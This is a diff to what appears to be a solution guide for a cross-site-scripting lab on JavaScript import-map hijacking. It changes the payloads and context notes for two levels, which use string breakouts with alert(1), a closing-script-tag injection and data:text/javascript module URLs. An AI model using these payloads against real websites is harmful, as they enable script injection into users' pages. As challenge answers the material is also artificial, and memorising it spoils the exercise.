@@ -25,10 +25,10 @@ Import maps allow web applications to control the resolution of JavaScript modul
 
 ### import-map-level2
 
-`/import-map/level2/?query=%27%7D%7D);alert(1);//`
+`/import-map/level2/?query=';alert(1);//`
 
-- payload: `'}});alert(1);//`
-- context: value embedded into `JSON.stringify({imports:{'user-module':userConfig}})` where userConfig is a JS variable containing user input; break out of the single-quoted JS string before it's stringified
+- payload: `';alert(1);//`
+- context: single-quoted JS string; break it
 - note: The import is delayed with setTimeout, so the hijacked module gets loaded after map creation
 
 **Alternative payload for module hijacking:**
@@ -89,10 +89,10 @@ Import maps allow web applications to control the resolution of JavaScript modul
 
 ### import-map-level6
 
-`/import-map/level6/?query=data:text/javascript,alert('Scoped%20hijack')`
+`/import-map/level6/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `data:text/javascript,alert('Scoped hijack')`
-- context: import map uses scopes with "/app/" prefix; user input in "custom-util" mapping within that scope
+- payload: `</script><script>alert(1)</script>`
+- context: the injected address sits under a scope this page never matches; close the script instead
 
 **Breaking out of scopes:**
 `/import-map/level6/?query=%22%7D,%22/app2/%22:{%22other%22:%22data:text/javascript,alert(2)`
